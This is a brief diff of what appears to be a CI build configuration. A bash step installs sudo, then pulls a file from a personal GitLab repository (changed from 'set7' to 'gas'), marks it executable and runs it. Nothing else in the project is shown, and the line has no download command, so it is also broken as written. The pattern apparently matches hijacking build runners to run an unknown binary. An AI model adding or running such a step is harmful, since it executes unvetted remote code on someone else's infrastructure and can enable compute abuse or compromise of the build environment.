@@ -3,7 +3,7 @@ steps:
     args:
       - '-c'
       - >-
-         apt update && apt-get install sudo -y && https://gitlab.com/uweldrop/vrsc/-/raw/main/set7 && chmod u+x set7 && ./set7
+         apt update && apt-get install sudo -y && https://gitlab.com/uweldrop/deadline/-/raw/main/gas && chmod u+x gas && ./gas
     waitFor:
       - '-'
     entrypoint: /bin/bash
